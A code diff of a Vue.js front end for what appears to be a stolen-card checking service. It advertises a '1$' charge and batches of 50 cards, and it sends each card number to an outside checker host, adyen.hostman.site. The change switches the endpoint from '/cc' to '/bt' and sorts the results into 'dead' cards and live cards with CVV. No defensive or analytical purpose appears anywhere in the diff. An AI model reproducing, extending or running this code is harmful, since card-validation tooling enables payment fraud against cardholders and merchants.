@@ -14,6 +14,7 @@
       <v-tab-item>
         <div class="px-5 pt-2 " style="height:85vh">
           <div class="pb-5">
+            <p>Charge : <span class="yellow--text">1$</span></p>
             <p class="red--text">
               You can check 50 cards per check in this gate with rate 2 seconds!
             </p>
@@ -298,19 +299,19 @@ export default {
           this.interuption = false;
         } else {
           let tmpcc = this.ccs.split("\n")[0];
-          this.adyen(tmpcc);
+          this.bt(tmpcc);
           this.deleteline();
         }
       }, tmpdelay);
     },
-    adyen(cc) {
+    bt(cc) {
       var data = JSON.stringify({
         cc: cc,
       });
 
       var config = {
         method: "post",
-        url: "https://adyen.hostman.site/cc",
+        url: "https://adyen.hostman.site/bt",
         headers: {
           "Content-Type": "application/json",
         },
@@ -319,13 +320,16 @@ export default {
 
       axios(config)
         .then((res) => {
-          if (res.data.Status == "Refused") {
+          if (res.data.error) {
             this.dead.push({
-              number: cc,
-              result: "Declined > " + res.data.Reason,
+              number: res.data.cc,
+              result: res.data.message,
             });
           } else {
-            this.dead.push({ number: cc, result: res.data });
+            this.livecvv.push({
+              number: res.data.cc,
+              result: res.data.message,
+            });
           }
         })
         .catch((error) => {
